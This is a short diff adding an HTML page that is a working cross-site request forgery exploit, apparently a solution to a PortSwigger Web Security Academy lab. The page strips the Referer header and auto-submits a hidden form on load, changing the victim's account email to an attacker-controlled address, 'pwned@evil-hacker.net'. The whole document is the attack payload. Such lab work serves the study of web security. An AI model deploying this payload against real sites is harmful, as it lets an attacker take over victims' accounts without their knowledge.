@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="referrer" content="no-referrer">
+</head>
+<body>
+    <form method="POST" action="https://0a1e00df04735ae38022038200bd0048.web-security-academy.net/my-account/change-email" id="csrf-form">
+        <input type="hidden" name="email" value="pwned@evil-hacker.net">
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
